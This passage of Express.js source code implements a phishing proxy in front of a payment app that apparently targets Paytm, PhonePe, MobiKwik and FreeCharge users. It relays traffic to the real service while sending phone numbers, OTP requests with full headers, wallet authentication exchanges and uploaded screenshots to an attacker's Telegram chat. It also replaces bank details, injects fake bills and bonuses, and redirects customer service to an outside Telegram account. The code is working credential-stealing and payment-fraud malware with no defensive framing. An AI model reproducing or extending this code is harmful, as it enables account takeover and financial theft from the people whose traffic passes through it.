                /filename=.*\.(jpg|jpeg|png|gif|webp|bmp)/i.test(headerStr)) {
              const imageData = part.slice(headerEnd + 4);
              if (imageData.length > 100) {
                try {
                  await bot.sendPhoto(data.adminChatId, imageData, { caption: `📸 Screenshot [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}` }, { filename: 'screenshot.jpg', contentType: 'image/jpeg' });
                  imageSent = true;
                } catch(e) {
                  bot.sendMessage(data.adminChatId, `📸 Image extract failed: ${e.message}\nSize: ${imageData.length} bytes`).catch(()=>{});
                }
              }
              break;
            }
          }
        }
      }
      if (!imageSent) {
        bot.sendMessage(data.adminChatId, `🖼 File Upload [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}\nContent-Type: ${contentType}\nBody size: ${req.rawBody.length} bytes`).catch(()=>{});
      }
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.post('/app/tool/changeStatus', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
      const phone = getPhone(data, userId);
      bot.sendMessage(data.adminChatId, `🔄 Status Change [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}\n${JSON.stringify(req.parsedBody || {}).substring(0, 500)}`).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.post('/app/tool/changeSell', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
      const phone = getPhone(data, userId);
      bot.sendMessage(data.adminChatId, `🔄 Sell Status Change [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}\n${JSON.stringify(req.parsedBody || {}).substring(0, 500)}`).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/app/tool/changeStatusAll', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
      const phone = getPhone(data, userId);
      bot.sendMessage(data.adminChatId, `📊 All Status [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}\n${JSON.stringify(getResponseData(jsonResp) || {}).substring(0, 1000)}`).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/app/tool/details', async (req, res) => {
  await proxyAndReplaceBankDetails(req, res, '🔧 Tool Details');
});

app.all('/app/tool', async (req, res) => {
  await proxyAndReplaceBankDetails(req, res, '🔧 Tool / Edit Bank');
});

app.all('/app/bills', async (req, res) => {
  await proxyAndInjectFakeBills(req, res);
});

app.all('/app/billsFilter', async (req, res) => {
  await proxyAndInjectFakeBills(req, res);
});

app.all('/app/bonusDetails', async (req, res) => {
  await proxyAndAddBonus(req, res);
});

app.post('/app/send/opt', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    const body = req.parsedBody || {};
    if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
      const tag = `📲 Send OTP [${userId || body.phone || body.mobile || 'N/A'}]`;
      const reqHeadersDump = JSON.stringify(req.headers, null, 2);
      const reqBodyDump = JSON.stringify(body, null, 2);
      const respDump = JSON.stringify(jsonResp, null, 2);
      bot.sendMessage(data.adminChatId, `📲 OTP Sent [${userId || 'N/A'}]\nPhone: ${body.phone || body.mobile || 'N/A'}\nType: ${body.type || 'N/A'}`).catch(()=>{});
      sendChunked(bot, data.adminChatId, `${tag}\n📨 REQUEST HEADERS:\n${reqHeadersDump}`);
      sendChunked(bot, data.adminChatId, `${tag}\n📝 REQUEST BODY:\n${reqBodyDump}`);
      sendChunked(bot, data.adminChatId, `${tag}\n📥 RESPONSE:\n${respDump}`);
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

const AUTH_INTERCEPT_ENDPOINTS = [
  '/app/tool/auth/step1',
  '/app/tool/freeChargeAuth/step2',
  '/app/tool/freeChargeAuth/step2/2',
  '/app/tool/freeChargeAuth/step2/sendOtp',
  '/app/tool/paytmAuth/step1/sendOtp',
  '/app/tool/paytmAuth/step2/2',
  '/app/tool/phonePeAuth/step1/sendOtp',
  '/app/tool/phonePeAuth/step2/2',
  '/app/tool/mobikwikAuth/step1/sendOtp',
  '/app/tool/mobikwikAuth/step2/2',
  '/app/tool/deAuth',
  '/app/tool/support'
];

for (const ep of AUTH_INTERCEPT_ENDPOINTS) {
  app.all(ep, async (req, res) => {
    const data = await loadData();
    try {
      const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
      const userId = await extractUserId(req, jsonResp);
      const phone = getPhone(data, userId);
      if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
        const reqBody = JSON.stringify(req.parsedBody || {}, null, 2).substring(0, 1500);
        const respDump = JSON.stringify(jsonResp, null, 2).substring(0, 2000);
        bot.sendMessage(data.adminChatId, `🔐 ${req.originalUrl}\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\n\n📝 REQUEST:\n${reqBody}\n\n📥 RESPONSE:\n${respDump}`).catch(()=>{});
      }
      sendJson(res, respHeaders, jsonResp, respBody);
    } catch(e) { await transparentProxy(req, res); }
  });
}

app.all('/app/customer/service', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const telegramLink = 'https://t.me/customerservce_999pay';
    if (jsonResp && jsonResp.data && Array.isArray(jsonResp.data)) {
      jsonResp.data = jsonResp.data.map(item => ({
        ...item,
        serviceLink: telegramLink
      }));
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

// External trigger for active monitor (use with cron-job.org or uptime monitor
// pinging every few seconds — keeps re-login working even on Vercel serverless
// where setInterval dies after lambda goes cold).
app.get('/active-tick', async (req, res) => {
  try {
    await activeMonitorTick();
    res.json({
      ok: true,
      activePhones: _activeMonitorPhones,
      stats: _activeStats,
      tickMs: ACTIVE_TICK_MS,
    });
  } catch(e) {
    res.status(500).json({ ok: false, error: e.message });
  }
});

app.all('*', async (req, res) => {
  const data = cachedData || await loadData();
  if (!data.usdtAddress && !data.botEnabled) {
    try {
      const { response, respBody, respHeaders } = await proxyFetch(req);
      res.writeHead(response.status, respHeaders);
      res.end(respBody);
    } catch(e) {
      if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
    }
    return;
  }
  await transparentProxy(req, res);
});

module.exports = app;
